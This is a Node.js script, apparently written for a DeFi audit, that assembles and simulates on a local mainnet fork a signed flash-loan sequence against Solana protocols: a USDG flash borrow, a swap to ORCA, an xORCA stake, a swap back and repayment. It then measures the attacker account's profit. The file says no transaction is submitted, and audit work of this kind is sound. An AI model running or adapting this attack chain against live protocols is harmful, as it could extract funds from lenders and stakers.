#!/usr/bin/env node
'use strict';

// Signed, sigVerify:true Solana v1 local-fork composition:
// Jupiter native USDG flash -> USDG/ORCA swap -> xORCA Stake ->
// xORCA/USDG swap -> refresh -> exact flash repay.
// Mainnet is read only and no transaction is submitted.
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const modules = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {Keypair, PublicKey, SystemProgram, TransactionInstruction, TransactionMessage} =
  require(modules + '@solana/web3.js');
const {getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID} =
  require(modules + '@solana/spl-token');
const {encodeV1} = require('./klend-v1-composition.js');

const dir = __dirname;
const outputPath = path.join(dir, 'orca-xorca-cross-asset-flash-v1.json');
const live = JSON.parse(fs.readFileSync(path.join(dir, 'orca-xorca-live-revalidation.json')));
const native = JSON.parse(fs.readFileSync(
  path.join(dir, 'jup6qf-native-flash-v1-simulations.json')));
const env = Object.fromEntries(fs.readFileSync('/tmp/composer-helius-rpc.env', 'utf8')
  .split(/\r?\n/).filter((line) => line.includes('='))
  .map((line) => line.split(/=(.*)/s).slice(0, 2)));
const upstreams = [...new Set([env.RPC_URL, env.HEAVY_RPC_URL].filter(Boolean))];
if (!upstreams.length) throw new Error('No read-only RPC configured');
const forkUrl = 'http://127.0.0.1:9007';
const P = (value) => new PublicKey(value);

const PROGRAM = P(live.identities.program);
const STATE = P(live.identities.state);
const STAKING_VAULT = P(live.identities.vault);
const ORCA = P(live.identities.orcaMint);
const XORCA = P(live.identities.xorcaMint);
const FLASH = P(native.nativeFlashProgram);
const TARGET = P(native.targetProgram);
const LIQUIDITY = P('6GjquP3CKxb9G6RDsDsbMRjvomhzzeDq9twa9mS8AumL');
const ATA_PROGRAM = P('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
const IX_SYSVAR = P('Sysvar1nstructions1111111111111111111111111');
const [FLASH_ADMIN] = PublicKey.findProgramAddressSync([Buffer.from('flashloan_admin')], FLASH);
const BORROW_DISC = Buffer.from([103, 19, 78, 24, 240, 9, 135, 63]);
const REPAY_DISC = Buffer.from([213, 47, 153, 137, 84, 243, 94, 232]);
const REFRESH_DISC = Buffer.from([239, 244, 10, 248, 116, 25, 53, 150]);
const usdG = native.setups.find((row) => row.symbol === 'USDG');
if (!usdG) throw new Error('USDG native flash setup unavailable');
const USDG = P(usdG.mint);
const setup = {
  mint: USDG, reserve: P(usdG.targetReserve), vault: P(usdG.targetVault),
  rateModel: P(usdG.targetRateModel), position: P(usdG.targetBorrowPosition),
  tokenProgram: P(usdG.tokenProgram), templateUserToken: P(usdG.borrowerTokenAccount),
};
let rpcId = 0;

async function rpcAt(endpoint, method, params) {
  const response = await fetch(endpoint, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params})});
  const body = await response.json();
  if (body.error) throw new Error(`${method}: ${JSON.stringify(body.error)}`);
  return body.result;
}

async function rpcUpstream(method, params) {
  const errors = [];
  for (const endpoint of upstreams) {
    try {
      const result = await rpcAt(endpoint, method, params);
      if (result !== null && result !== undefined) return result;
      errors.push('null result');
    } catch (error) { errors.push(error.message); }
  }
  throw new Error(`${method} failed: ${errors.join(' | ')}`);
}
const rpcFork = (method, params) => rpcAt(forkUrl, method, params);

function u64(value) { const out = Buffer.alloc(8); out.writeBigUInt64LE(BigInt(value)); return out; }
function fromJupiter(ix) {
  return new TransactionInstruction({programId: P(ix.programId),
    keys: ix.accounts.map((account) => ({pubkey: P(account.pubkey),
      isSigner: account.isSigner, isWritable: account.isWritable})),
    data: Buffer.from(ix.data, 'base64')});
}
async function fetchJsonWithRetry(url, options = {}) {
  let last;
  for (let attempt = 0; attempt < 7; attempt += 1) {
    const response = await fetch(url, {...options,
      headers: {...(options.headers || {}), accept: 'application/json'}});
    const text = await response.text();
    let body;
    try { body = JSON.parse(text); }
    catch (error) { body = {error: text.slice(0, 240) || error.message}; }
    if (response.status !== 429 && response.status < 500) return {response, body};
    last = new Error(`HTTP ${response.status}: ${body.error || 'retryable Jupiter response'}`);
    await new Promise((resolve) => setTimeout(resolve, 1000 * (attempt + 1)));
  }
  throw last;
}
function flashIx(discriminator, owner, userToken, amount) {
  return new TransactionInstruction({programId: FLASH, keys: [
    {pubkey: owner, isSigner: true, isWritable: true},
    {pubkey: FLASH_ADMIN, isSigner: false, isWritable: true},
    {pubkey: userToken, isSigner: false, isWritable: true},
    {pubkey: setup.mint, isSigner: false, isWritable: false},
    {pubkey: setup.reserve, isSigner: false, isWritable: true},
    {pubkey: setup.position, isSigner: false, isWritable: true},
    {pubkey: setup.rateModel, isSigner: false, isWritable: false},
    {pubkey: setup.vault, isSigner: false, isWritable: true},
    {pubkey: LIQUIDITY, isSigner: false, isWritable: false},
    {pubkey: TARGET, isSigner: false, isWritable: false},
    {pubkey: setup.tokenProgram, isSigner: false, isWritable: false},
    {pubkey: ATA_PROGRAM, isSigner: false, isWritable: false},
    {pubkey: SystemProgram.programId, isSigner: false, isWritable: false},
    {pubkey: IX_SYSVAR, isSigner: false, isWritable: false},
  ], data: Buffer.concat([discriminator, u64(amount)])});
}
function refreshIx() {
  return new TransactionInstruction({programId: TARGET, keys: [
    {pubkey: setup.reserve, isSigner: false, isWritable: true},
    {pubkey: setup.rateModel, isSigner: false, isWritable: false},
  ], data: Buffer.concat([REFRESH_DISC, setup.mint.toBuffer()])});
}
function stakeIx(owner, orcaToken, xorcaToken, amount) {
  return new TransactionInstruction({programId: PROGRAM, keys: [
    {pubkey: owner, isSigner: true, isWritable: true},
    {pubkey: STAKING_VAULT, isSigner: false, isWritable: true},
    {pubkey: orcaToken, isSigner: false, isWritable: true},
    {pubkey: xorcaToken, isSigner: false, isWritable: true},
    {pubkey: XORCA, isSigner: false, isWritable: true},
    {pubkey: STATE, isSigner: false, isWritable: false},
    {pubkey: ORCA, isSigner: false, isWritable: false},
    {pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false},
  ], data: Buffer.concat([Buffer.from([0]), u64(amount)])});
}

async function jupiterSwap(inputMint, outputMint, amount, user, destination) {
  const url = new URL('https://lite-api.jup.ag/swap/v1/quote');
  url.searchParams.set('inputMint', inputMint.toString());
  url.searchParams.set('outputMint', outputMint.toString());
  url.searchParams.set('amount', BigInt(amount).toString());
  url.searchParams.set('swapMode', 'ExactIn');
  url.searchParams.set('slippageBps', '100');
  url.searchParams.set('restrictIntermediateTokens', 'true');
  url.searchParams.set('maxAccounts', '24');
  const quoted = await fetchJsonWithRetry(url);
  if (!quoted.response.ok || !quoted.body.outAmount)
    throw new Error(`quote: ${JSON.stringify(quoted.body)}`);
  const quoteResponse = quoted.body;
  const built = await fetchJsonWithRetry('https://lite-api.jup.ag/swap/v1/swap-instructions', {
    method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({quoteResponse, userPublicKey: user.toString(),
      destinationTokenAccount: destination.toString(), wrapAndUnwrapSol: false,
      useSharedAccounts: true, dynamicComputeUnitLimit: false, skipUserAccountsRpcCalls: true}),
  });
  const {response, body} = built;
  if (!response.ok || body.error || !body.swapInstruction)
    throw new Error(`swap-instructions: ${JSON.stringify(body)}`);
  return {instructions: [...(body.setupInstructions || []).map(fromJupiter),
    fromJupiter(body.swapInstruction), ...(body.cleanupInstruction ? [fromJupiter(body.cleanupInstruction)] : [])],
    quote: {inputMint: quoteResponse.inputMint, outputMint: quoteResponse.outputMint,
      inAmount: quoteResponse.inAmount, outAmount: quoteResponse.outAmount,
      otherAmountThreshold: quoteResponse.otherAmountThreshold,
      priceImpactPct: quoteResponse.priceImpactPct, contextSlot: quoteResponse.contextSlot,
      routePlan: quoteResponse.routePlan.map((step) => ({label: step.swapInfo?.label,
        ammKey: step.swapInfo?.ammKey, inputMint: step.swapInfo?.inputMint,
        outputMint: step.swapInfo?.outputMint, inAmount: step.swapInfo?.inAmount,
        outAmount: step.swapInfo?.outAmount}))},
    lookupTables: body.addressLookupTableAddresses || []};
}

function signerFor(keypair) {
  return crypto.createPrivateKey({key: Buffer.concat([
    Buffer.from('302e020100300506032b657004220420', 'hex'),
    Buffer.from(keypair.secretKey.subarray(0, 32))]), format: 'der', type: 'pkcs8'});
}
function signV1(encoded, instructions, payer, blockhash, keypairs) {
  const compiled = new TransactionMessage({payerKey: payer, recentBlockhash: blockhash,
    instructions}).compileToV0Message();
  const order = compiled.staticAccountKeys.slice(0, encoded.requiredSignatures).map(String);
  const keyMap = new Map(keypairs.map((keypair) => [keypair.publicKey.toString(), keypair]));
  const signed = Buffer.from(encoded.wire);
  const message = signed.subarray(0, signed.length - 64 * encoded.requiredSignatures);
  order.forEach((address, index) => crypto.sign(null, message, signerFor(keyMap.get(address)))
    .copy(signed, signed.length - 64 * encoded.requiredSignatures + index * 64));
  return {signed, order};
}
function tokenAmount(account) {
  if (!account?.data) return null;
  const data = Buffer.from(account.data[0], 'base64');
  return data.length >= 72 ? data.readBigUInt64LE(64).toString() : null;
}
function hashAccount(account) {
  if (!account?.data) return null;
  return crypto.createHash('sha256').update(Buffer.from(account.data[0], 'base64')).digest('hex');
}
async function setForkAccount(address, owner, lamports, data) {
  await rpcFork('surfnet_setAccount', [address.toString(), {data: data.toString('hex'),
    executable: false, lamports, owner: owner.toString(), rentEpoch: 0}]);
}
function classicTokenData(mint, owner, amount) {
  const data = Buffer.alloc(165); mint.toBuffer().copy(data, 0); owner.toBuffer().copy(data, 32);
  data.writeBigUInt64LE(BigInt(amount), 64); data[108] = 1; return data;
}
function clonedToken2022Data(template, owner, amount) {
  const data = Buffer.from(template.data[0], 'base64');
  setup.mint.toBuffer().copy(data, 0); owner.toBuffer().copy(data, 32);
  data.writeBigUInt64LE(BigInt(amount), 64); data[108] = 1; return data;
}

async function simulateCase(attacker, accounts, amount, prefundRaw) {
  const first = await jupiterSwap(USDG, ORCA, amount, attacker.publicKey, accounts.orca);
  const orcaStakeRaw = BigInt(first.quote.outAmount);
  const assets = BigInt(live.currentAccounts.nonEscrowedOrcaRaw);
  const supply = BigInt(live.currentAccounts.xorcaMint.supplyRaw);
  const xorcaMintedRaw = orcaStakeRaw * (supply + 100n) / (assets + 100n);
  if (xorcaMintedRaw === 0n) throw new Error('stake output rounds to zero xORCA');
  const second = await jupiterSwap(XORCA, USDG, xorcaMintedRaw, attacker.publicKey, accounts.usdg);
  const instructions = [flashIx(BORROW_DISC, attacker.publicKey, accounts.usdg, amount),
    ...first.instructions, stakeIx(attacker.publicKey, accounts.orca, accounts.xorca, orcaStakeRaw),
    ...second.instructions, refreshIx(), flashIx(REPAY_DISC, attacker.publicKey, accounts.usdg, amount)];
  const blockhash = (await rpcFork('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  const encoded = encodeV1(instructions, attacker.publicKey, blockhash);
  const signed = signV1(encoded, instructions, attacker.publicKey, blockhash, [attacker]);
  const watched = [accounts.usdg, accounts.orca, accounts.xorca, setup.vault,
    setup.reserve, setup.position, FLASH_ADMIN, STAKING_VAULT, XORCA];
  const preResult = await rpcFork('getMultipleAccounts', [watched.map(String),
    {encoding: 'base64', commitment: 'processed'}]);
  const result = await rpcFork('simulateTransaction', [signed.signed.toString('base64'), {
    encoding: 'base64', sigVerify: true, replaceRecentBlockhash: false,
    commitment: 'processed', innerInstructions: true,
    accounts: {encoding: 'base64', addresses: watched.map(String)}}]);
  const post = result.value.accounts || [];
  const beforeAmounts = preResult.value.map(tokenAmount);
  const afterAmounts = post.map(tokenAmount);
  const delta = (a, b) => a == null || b == null ? null : (BigInt(a) - BigInt(b)).toString();
  return {name: `signed_jupiter_native_usdg_${amount}_stake_exit_repay`,
    amountRaw: amount.toString(), syntheticPrefundRaw: prefundRaw.toString(),
    firstSwap: first.quote, orcaStakeRaw: orcaStakeRaw.toString(),
    xorcaMintedRaw: xorcaMintedRaw.toString(), secondSwap: second.quote,
    expectedUsdGExitRaw: second.quote.outAmount,
    expectedUsdGNetBeforeRepayRaw: (BigInt(second.quote.outAmount) - amount).toString(),
    environment: 'signed local fork of current mainnet protocol/DEX accounts',
    liveSubmission: false, signatureVerification: true, forkProtocolMutation: false,
    syntheticMutation: 'fresh attacker system/token accounts only',
    err: result.value.err, unitsConsumed: result.value.unitsConsumed,
    loadedAccountsDataSize: result.value.loadedAccountsDataSize,
    wire: {version: 1, bytes: encoded.sizeBytes, addressCount: encoded.addressCount,
      instructionCount: encoded.instructionCount, requiredSignatures: encoded.requiredSignatures,
      signerOrder: signed.order, sha256: crypto.createHash('sha256').update(signed.signed).digest('hex')},
    watched: watched.map(String), accounting: {beforeRaw: beforeAmounts, afterRaw: afterAmounts,
      deltasRaw: afterAmounts.map((value, index) => delta(value, beforeAmounts[index])),
      hashesBefore: preResult.value.map(hashAccount), hashesAfter: post.map(hashAccount),
      attackerUsdGBeforeRaw: beforeAmounts[0], attackerUsdGAfterRaw: afterAmounts[0],
      attackerUsdGDeltaRaw: delta(afterAmounts[0], beforeAmounts[0]),
      attackerOrcaAfterRaw: afterAmounts[1], attackerXorcaAfterRaw: afterAmounts[2],
      lenderVaultDeltaRaw: delta(afterAmounts[3], beforeAmounts[3]),
      targetReserveHashRestored: hashAccount(post[4]) === hashAccount(preResult.value[4]),
      targetPositionHashRestored: hashAccount(post[5]) === hashAccount(preResult.value[5]),
      flashAdminHashRestored: hashAccount(post[6]) === hashAccount(preResult.value[6])},
    logs: (result.value.logs || []).filter((line) => line.includes('Instruction:') ||
      line.includes('success') || line.includes('failed') || line.includes('Error'))};
}

async function main() {
  const attacker = Keypair.generate();
  const accounts = {
    usdg: getAssociatedTokenAddressSync(USDG, attacker.publicKey, false, TOKEN_2022_PROGRAM_ID),
    orca: getAssociatedTokenAddressSync(ORCA, attacker.publicKey),
    xorca: getAssociatedTokenAddressSync(XORCA, attacker.publicKey),
  };
  const templateResult = await rpcUpstream('getAccountInfo', [setup.templateUserToken.toString(),
    {encoding: 'base64', commitment: 'confirmed'}]);
  const template = templateResult.value;
  if (!template) throw new Error('USDG Token-2022 template account unavailable');
  for (const address of [PROGRAM, STATE, STAKING_VAULT, ORCA, XORCA, FLASH, TARGET,
    LIQUIDITY, FLASH_ADMIN, setup.reserve, setup.vault, setup.rateModel, setup.position, USDG]) {
    await rpcFork('getAccountInfo', [address.toString(), {encoding: 'base64', commitment: 'processed'}]);
  }
  const prefundRaw = 100_000_000n;
  await setForkAccount(attacker.publicKey, SystemProgram.programId, 20_000_000_000, Buffer.alloc(0));
  await setForkAccount(accounts.usdg, setup.tokenProgram, template.lamports,
    clonedToken2022Data(template, attacker.publicKey, prefundRaw));
  await setForkAccount(accounts.orca, TOKEN_PROGRAM_ID, 2_039_280,
    classicTokenData(ORCA, attacker.publicKey, 0n));
  await setForkAccount(accounts.xorca, TOKEN_PROGRAM_ID, 2_039_280,
    classicTokenData(XORCA, attacker.publicKey, 0n));

  const results = [];
  const quoteBlockers = [];
  for (const amount of [1000n, 1_000_000n, 100_000_000n]) {
    try { results.push(await simulateCase(attacker, accounts, amount, prefundRaw)); }
    catch (error) { quoteBlockers.push({amountRaw: amount.toString(), blocker: error.message,
      diagnostic: error.stack}); }
  }
  const output = {generatedAt: new Date().toISOString(), readOnly: true, liveSubmission: false,
    sigVerify: true, targetProgram: PROGRAM.toString(), nativeFlashProgram: FLASH.toString(),
    liquidityProgram: TARGET.toString(), sourceMint: USDG.toString(), sourceSymbol: 'USDG',
    sourceConfiguredFeeBps: '0', attacker: attacker.publicKey.toString(),
    attackerAccounts: Object.fromEntries(Object.entries(accounts).map(([key, value]) => [key, value.toString()])),
    secretKeysStored: false, rpcUrlsStored: false, protocolAccountsMutated: false,
    results, quoteBlockers,
    summary: {attemptedAmounts: 3, simulatedCases: results.length,
      successfulFullRepayCases: results.filter((row) => !row.err &&
        row.accounting.lenderVaultDeltaRaw === '0').length,
      positiveAttackerUsdGCases: results.filter((row) =>
        BigInt(row.accounting.attackerUsdGDeltaRaw || 0) > 0n).map((row) => row.name),
      maxWireBytes: Math.max(0, ...results.map((row) => row.wire.bytes)),
      maxAddressCount: Math.max(0, ...results.map((row) => row.wire.addressCount)),
      allWithinV1Limits: results.every((row) => row.wire.bytes <= 4096 &&
        row.wire.addressCount <= 64)},
    interpretation: 'The synthetic USDG prefund is explicitly included so loss-making cases can still complete exact repayment. Attacker USDG delta is measured after full lender repayment; ORCA and xORCA must both unwind to zero.'};
  fs.writeFileSync(outputPath, JSON.stringify(output, null, 2) + '\n');
  console.log(JSON.stringify({generatedAt: output.generatedAt, summary: output.summary,
    quoteBlockers, results: results.map((row) => ({name: row.name, err: row.err,
      wire: row.wire, expectedUsdGNetBeforeRepayRaw: row.expectedUsdGNetBeforeRepayRaw,
      accounting: row.accounting, trace: row.logs.slice(-10)}))}, null, 2));
}

main().catch((error) => { console.error(error.stack || error); process.exitCode = 1; });
